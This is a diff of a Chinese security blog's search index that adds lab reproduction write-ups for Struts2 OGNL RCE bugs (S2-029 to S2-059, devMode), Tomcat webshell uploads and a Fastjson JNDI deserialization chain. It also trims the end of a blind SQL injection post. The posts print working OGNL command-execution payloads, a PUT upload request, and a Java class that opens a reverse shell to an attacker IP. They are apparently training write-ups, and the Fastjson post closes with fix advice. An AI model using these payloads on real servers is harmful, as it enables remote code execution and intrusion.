-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D; 68</span><br></pre></td></tr></table></figure>
-<p>payload请求</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))&#x3D;%2068--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092319.png" alt="image"></p>
-<p>获取 users 表中的内容。获取 username 中的第一行的第一个字符的 ascii，与 68 进行比较，即为 D。而我们从表中得知第一行的数据为 Dumb。所以接下来只需要重复造轮子即可</p>
-<hr>
-<p>总结：以上我们通过使用不同的语句，将通过布尔盲注 SQL 的所有<br>的 payload 进行演示了一次。想必通过实例更能够对 sql 布尔盲注语句熟悉和理解了。</p>
+    <title>S2-029 CVE-2016-0785复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
+<a id="more"></a>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li>
+<li>POC利用</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>sqli-labs靶场</category>
+        <category>vulfocus靶场练习</category>
       </categories>
       <tags>
-        <tag>sqli-labs</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-052 CVE-2017-9805复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p>
+</li>
+<li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-053 CVE-2017-12611复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li>
+<li>利用POC</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-057 CVE-2018-11776复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
+</li>
+<li><p>poc利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-059 CVE-2019-0230复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Struts于2020年8月13日披露 S2-059 Struts 远程代码执行漏洞（CVE-2019-0230），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。腾讯安全专家提醒Apache Struts用户尽快升级到2.5.22或以上版本，避免遭遇黑客攻击。    </p>
+<p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架，应用十分广泛。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.0.0 - 2.5.20</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081416.png" alt="image"></p>
+</li>
+<li><p>POC利用：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25&#123;%23_memberAccess.allowPrivateAccess%3dtrue,%23_memberAccess.allowStaticMethodAccess%3dtrue,%23_memberAccess.excludedClasses%3d%23_memberAccess.acceptProperties,%23_memberAccess.excludedPackageNamePatterns%3d%23_memberAccess.acceptProperties,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23a%3d%40java.lang.Runtime%40getRuntime(),%23s%3dnew+java.util.Scanner(%23a.exec(&#39;ls&#39;).getInputStream()).useDelimiter(&#39;\\\\A&#39;),%23str%3d%23s.hasNext()%3f%23s.next()%3a&#39;&#39;,%23res.print(%23str),%23res.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081417.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-devMode CVE-2016-4438复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081418.png" alt="image"></p>
+</li>
+<li><p>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081419.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat-弱口令-getshell复现过程</title>
+    <url>/2020/08/12/Vulfocus%E9%9D%B6%E5%9C%BA/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache+Tomcat 是很常用的网站解决方案，Apache 用于提供 web 服务，而 Tomcat 是 Apache 服务器的扩展，用于运行 jsp 页面和 servlet。Tomcat 有一个管理后台，其用户名和密码在 Tomcat 安装目录下的 conf\tomcat-users.xml 文件中配置，不少管理员为了方便，经常采用弱口令。 Tomcat 支持在后台部署 war 包，可以直接将 webshell 部署到 web 目录下，如果 tomcat 后台管理用户存在弱口令，这很容易被利用上传 webshell。</p>
+<h2 id="知识点：什么是war包"><a href="#知识点：什么是war包" class="headerlink" title="知识点：什么是war包"></a>知识点：什么是war包</h2><p>war 包是一种打包格式<br>Java web工程，都是打成war包，进行发布，打成war包的好处是不会缺少目录，并且只管理好一个发布文件就好，并且tomcat服务器能够自动识别，将war包放在tomcat容器的webapps下，启动服务，即可运行该项目，该war包会自动解压出一个同名的文件夹。<br>war 包的结构（是一个web 项目编译后的结果）</p>
+<a id="more"></a>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
+<li><p>使用vulfocus启动漏洞环境<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081201.png" alt="image"></p>
+</li>
+<li><p>访问漏洞环境，点击“Manager App”<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081202.png" alt="image"></p>
+</li>
+<li><p>弱口令登录，账号tomcat，密码tomcat</p>
+<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081203.png" alt="image"></p>
+</li>
+<li><p>把jsp木马解压为zip压缩文件，改后缀名为war</p>
+</li>
+<li><p>上传war包<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081204.png" alt="image"></p>
+</li>
+<li><p>部署war包之后，war包会在当前路径下解压。<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081205.png" alt="image"></p>
+</li>
+<li><p>访问路径是 /war (war包路径) /XXX.jsp（你的 webshell），拿到flag<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081206.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat 任意写入文件漏洞复现过程（CVE-2017-12615）</title>
+    <url>/2020/08/11/Vulfocus%E9%9D%B6%E5%9C%BA/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，文件中的代码被服务器执行。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Tomcat &gt;=7.0.0，&lt;=7.0.79</p>
+<a id="more"></a>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
+<li><p>使用vulfocus启动漏洞环境<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081101.png" alt="image"></p>
+</li>
+<li><p>访问页面如下：<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081102.png" alt="image"></p>
+</li>
+<li><p>直接抓包，修改请求方式为 PUT，并且设置文件名为1.jsp(名字随意)，然后填充 shell(jsp shell即可)文件内容，发送成功后，服务器返回状态码201。我这里直接上传大马<br><img src="14C523405179468B8FB07461BF2ACA55" alt="image"></p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko&#x2F;20100101 Firefox&#x2F;76.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 60577</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>直接访问上传的木马文件，拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081103.png" alt="image"></li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Fastjson_1.2.24反序列化漏洞复现过程</title>
+    <url>/2020/08/08/Vulfocus%E9%9D%B6%E5%9C%BA/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>FastJson 库是 Java 的一个 Json 库，其作用是将 Java 对象转换成 json 数据来表示，也可以将 json 数据转换成 Java 对象，使用非常方便，号称是执行速度最快的库。</p>
+<p>在 1.2.24 版本的 Fastjson 出现了一个反序列化的漏洞，fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>fastjson &lt;= 1.2.47</p>
+<a id="more"></a>
+<h2 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><ol>
+<li>搭建vulfocus漏洞环境</li>
+<li>启动“vulfocus/fastjson-cnvd_2017_02833”</li>
+</ol>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080801.png" alt="image"><br>3. 访问页面显示如下说明环境正常<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080802.png" alt="image"></p>
+<h3 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h3><p>可以通过DNS回显的方式检测后端是否使用Fastjson</p>
+<p>构造请求如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.130:59541</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>其他回显方式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080803.png" alt="image"></p>
+<h3 id="fastjson1-2-47以下版本通杀poc："><a href="#fastjson1-2-47以下版本通杀poc：" class="headerlink" title="fastjson1.2.47以下版本通杀poc："></a>fastjson1.2.47以下版本通杀poc：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;f&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;asdfasfd&#x2F;&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">age:11</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>其中{“@type”:”com.sun.rowset.JdbcRowSetImpl”, “dataSourceName”:”ldap://asdfasfd/“, “autoCommit”:true}也可以替换成其他利用链</p>
+</blockquote>
+<h3 id="攻击机环境配置"><a href="#攻击机环境配置" class="headerlink" title="攻击机环境配置"></a>攻击机环境配置</h3><h4 id="centos7服务器，可通外网"><a href="#centos7服务器，可通外网" class="headerlink" title="centos7服务器，可通外网"></a>centos7服务器，可通外网</h4><ol>
+<li><p>修改 java 恶意类代码保存为 TouchFile.java</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">   static &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">          Runtime r &#x3D; Runtime.getRuntime();</span><br><span class="line">          Process p &#x3D; r.exec(new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;1888 0&gt;&amp;1&quot;&#125;);</span><br><span class="line">          p.waitFor();</span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line">           &#x2F;&#x2F; do nothing</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 将恶意java代码上传到攻击机，并使用javac编译（需安装jdk1.8并配置环境变量）<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080804.png" alt="image"></p>
+</li>
+<li><p>使用 python -m SimpleHTTPServer 快速搭建http服务<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080805.png" alt="image"><br> 访问ip+1111端口号，证明http服务搭建正确<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080806.png" alt="image"><br> 服务器收到响应<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080807.png" alt="image"></p>
+</li>
+<li><p>开启ldap服务</p>
+<ul>
+<li><p>使用git下载<strong>marshalsec</strong>，mvn编译<strong>marshalsec</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mbechler&#x2F;marshalsec.git</span><br><span class="line">cd marshalsec&#x2F;</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure></li>
+<li><p>使用<strong>marshalsec</strong>开启ldap服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;ip:1111&#x2F;#TouchFile 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080808.png" alt="image"></p>
+</li>
+<li><p>nc监听1888端口</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080809.png" alt="image"></p>
+</li>
+</ul>
+</li>
+<li><p>构造payload发送请求</p>
+</li>
+</ol>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080810.png" alt="image"><br>5. ldap服务收到请求<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080811.png" alt="image"><br>6. 监听的1888端口成功反弹shell，拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080812.png" alt="image"></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
+<li>升级Fastjson到最新版</li>
+<li>WAF拦截过滤请求包中的 @type, %u0040%u0074%u0079%u0070%u0065, \u0040type, \x04type等多种编码的autotype变形</li>
+<li>最少升级到1.2.48以上版本且关闭autotype选项</li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Fastjson</tag>
       </tags>
   </entry>
 </search>
